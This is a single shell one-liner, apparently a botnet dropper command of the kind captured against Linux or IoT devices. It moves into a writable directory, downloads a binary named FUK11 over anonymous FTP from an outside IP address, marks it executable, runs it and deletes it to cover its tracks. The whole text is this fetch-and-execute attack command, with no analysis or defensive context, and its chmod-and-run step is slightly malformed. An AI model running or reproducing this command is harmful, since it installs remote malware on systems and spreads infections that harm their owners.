cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 FUK11 FUK11; chmod +x FUK11 ./FUK11; rm -rf FUK11
